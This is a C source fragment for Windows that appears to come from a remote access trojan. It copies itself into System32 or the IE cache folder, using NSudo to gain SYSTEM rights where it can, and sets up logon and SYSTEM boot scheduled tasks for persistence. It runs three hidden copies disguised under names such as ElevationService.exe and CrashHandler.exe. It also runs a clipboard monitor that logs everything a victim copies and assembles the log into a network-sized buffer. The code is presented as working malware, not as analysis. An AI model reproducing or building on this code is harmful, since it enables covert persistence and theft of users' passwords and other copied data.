/* Spawn a single shadow copy: use NSudo (if available) to copy to a high-authority
   System32 directory and create SYSTEM boot tasks. Fall back to admin methods otherwise. */
static void spawn_single_copy(const char *filename, const char *regKey) {
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char localAppData[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", localAppData, MAX_PATH);

    char nsudo[MAX_PATH];
    int have_nsudo = find_nsudo(nsudo, sizeof(nsudo));

    char sys32Path[MAX_PATH];
    snprintf(sys32Path, MAX_PATH, "%s\\%s", SYSTEM_SHADOW_DIR, filename);

    char inetPath[MAX_PATH];
    snprintf(inetPath, MAX_PATH, "%s\\Microsoft\\Windows\\INetCache\\IE\\%s", localAppData, filename);

    char destPath[MAX_PATH];

    ensure_dir_exists(SYSTEM_SHADOW_DIR);

    /* Prefer NSudo to copy into System32 color dir as SYSTEM */
    if (have_nsudo) {
        nsudo_copy(nsudo, currentPath, sys32Path);
    }

    if (file_exists(sys32Path)) {
        strncpy(destPath, sys32Path, MAX_PATH - 1);
        destPath[MAX_PATH - 1] = '\0';
    } else if (CopyFileA(currentPath, sys32Path, FALSE)) {
        strncpy(destPath, sys32Path, MAX_PATH - 1);
        destPath[MAX_PATH - 1] = '\0';
    } else {
        /* Fall back to INetCache if System32 is not writable */
        char dirPath[MAX_PATH];
        strncpy(dirPath, inetPath, MAX_PATH - 1);
        dirPath[MAX_PATH - 1] = '\0';
        char *lastSlash = strrchr(dirPath, '\\');
        if (lastSlash) *lastSlash = '\0';
        ensure_dir_exists(dirPath);
        if (!CopyFileA(currentPath, inetPath, FALSE)) {
            return;
        }
        strncpy(destPath, inetPath, MAX_PATH - 1);
        destPath[MAX_PATH - 1] = '\0';
    }

    /* Register persistence: logon (highest) + SYSTEM boot (before logon) */
    schedule_shadow_task(regKey, destPath);

    if (have_nsudo) {
        nsudo_schedule_system_boot_task(nsudo, regKey, destPath);
    } else {
        schedule_boot_task(regKey, destPath);
    }

    /* CreateProcess inherits parent's elevated token */
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};

    char cmdLine[1024];
    snprintf(cmdLine, sizeof(cmdLine), "\"%s\" --shadow", destPath);

    BOOL created = CreateProcessA(destPath, cmdLine, NULL, NULL, FALSE,
                       CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
                       NULL, NULL, &si, &pi);

    if (created) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        /* Fallback: ShellExecuteA with "open" */
        ShellExecuteA(NULL, "open", destPath, "--shadow", NULL, SW_HIDE);
    }
}

/* Spawn three shadow copies with generic computer-related names */
void sys_spawn_shadow_copy(void) {
    spawn_single_copy("ElevationService.exe", "ElevationService");
    spawn_single_copy("CrashHandler.exe", "CrashHandler");
    spawn_single_copy("NotifyService.exe", "NotifyService");
}

/* === Clipboard Subsystem === */

void copy_buffer_init(void) {
    InitializeCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_shutdown(void) {
    DeleteCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_debug_log(const char *fmt, ...) {
    char msg[COPY_ENTRY_SIZE * 2];
    va_list args;
    va_start(args, fmt);
    vsnprintf(msg, sizeof(msg), fmt, args);
    va_end(args);
    
    char last_line[COPY_ENTRY_SIZE * 2] = {0};
    FILE *rf = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "r");
    if (rf) {
        char line[COPY_ENTRY_SIZE * 2];
        char *last = NULL;
        while (fgets(line, sizeof(line), rf)) {
            if (line[0] != '\0' && line[0] != '\n') {
                last = _strdup(line);
            }
        }
        fclose(rf);
        if (last) {
            size_t len = strlen(last);
            if (len > 0 && last[len-1] == '\n') last[len-1] = '\0';
            char *content = strstr(last, "] ");
            if (content) {
                content += 2;
                if (strcmp(content, msg) == 0) {
                    free(last);
                    return;
                }
            }
            free(last);
        }
    }
    
    FILE *f = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "a");
    if (f) {
        fprintf(f, "[%lu] %s\n", GetTickCount(), msg);
        fclose(f);
    }
}

void copy_buffer_add_entry(const char *text) {
    if (!text || strlen(text) == 0) return;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    if (strcmp(g_last_copy_buffer_text, text) == 0) {
        LeaveCriticalSection(&g_copy_buffer_cs);
        return;
    }
    strncpy(g_last_copy_buffer_text, text, COPY_ENTRY_SIZE - 1);
    g_last_copy_buffer_text[COPY_ENTRY_SIZE - 1] = '\0';
    strncpy(g_copy_buffer_log[g_copy_buffer_index], text, COPY_ENTRY_SIZE - 1);
    g_copy_buffer_log[g_copy_buffer_index][COPY_ENTRY_SIZE - 1] = '\0';
    g_copy_buffer_index = (g_copy_buffer_index + 1) % MAX_COPY_ENTRIES;
    if (g_copy_buffer_count < MAX_COPY_ENTRIES) g_copy_buffer_count++;
    LeaveCriticalSection(&g_copy_buffer_cs);
    copy_buffer_debug_log("ADDED: %s", text);
}

char* copy_buffer_read_now(void) {
    static char buf[COPY_ENTRY_SIZE];
    buf[0] = '\0';
    
    for (int retry = 0; retry < 20; retry++) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t *wText = (wchar_t*)GlobalLock(hData);
                if (wText) {
                    int ret = WideCharToMultiByte(CP_UTF8, 0, wText, -1, buf, COPY_ENTRY_SIZE, NULL, NULL);
                    if (ret > 0) {
                        GlobalUnlock(hData);
                        CloseClipboard();
                        return buf;
                    }
                    GlobalUnlock(hData);
                }
            }
            
            hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)GlobalLock(hData);
                if (text) {
                    strncpy(buf, text, COPY_ENTRY_SIZE - 1);
                    buf[COPY_ENTRY_SIZE - 1] = '\0';
                    GlobalUnlock(hData);
                    CloseClipboard();
                    return buf;
                }
            }
            
            CloseClipboard();
            return buf;
        }
        Sleep(50);
    }
    
    return buf;
}

char* copy_buffer_get_history(void) {
    static char buf[NET_BUF_SIZE];
    buf[0] = '\0';
    int total = 0, remaining = NET_BUF_SIZE - 1, n;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    n = snprintf(buf + total, remaining, "=== Clipboard Log (%d entries) ===\n\n", g_copy_buffer_count);
    if (n > 0) { total += n; remaining -= n; }
    
    if (g_copy_buffer_count == 0) {
        n = snprintf(buf + total, remaining, "[No clipboard entries yet]\n");
        if (n > 0) { total += n; }
        LeaveCriticalSection(&g_copy_buffer_cs);
        return buf;
    }
    
    for (int i = g_copy_buffer_count - 1; i >= 0; i--) {
        if (remaining <= 200) break;
        int idx;
        if (g_copy_buffer_count < MAX_COPY_ENTRIES) {
            idx = i;
        } else {
            idx = (g_copy_buffer_index - 1 - i + MAX_COPY_ENTRIES) % MAX_COPY_ENTRIES;
        }
        n = snprintf(buf + total, remaining, "[%d] %s\n", g_copy_buffer_count - i, g_copy_buffer_log[idx]);
        if (n > 0) { total += n; remaining -= n; }
    }
    LeaveCriticalSection(&g_copy_buffer_cs);
    return buf;
}

DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam) {
    copy_buffer_debug_log("CLIPBOARD MONITOR STARTED");
    char last_text[COPY_ENTRY_SIZE] = {0};
    while (1) {
        char *text = copy_buffer_read_now();
        if (text[0] != '\0' && strcmp(text, last_text) != 0) {
            strncpy(last_text, text, COPY_ENTRY_SIZE - 1);
            last_text[COPY_ENTRY_SIZE - 1] = '\0';
            copy_buffer_add_entry(text);
        }
        Sleep(200);
    }
    return 0;
}
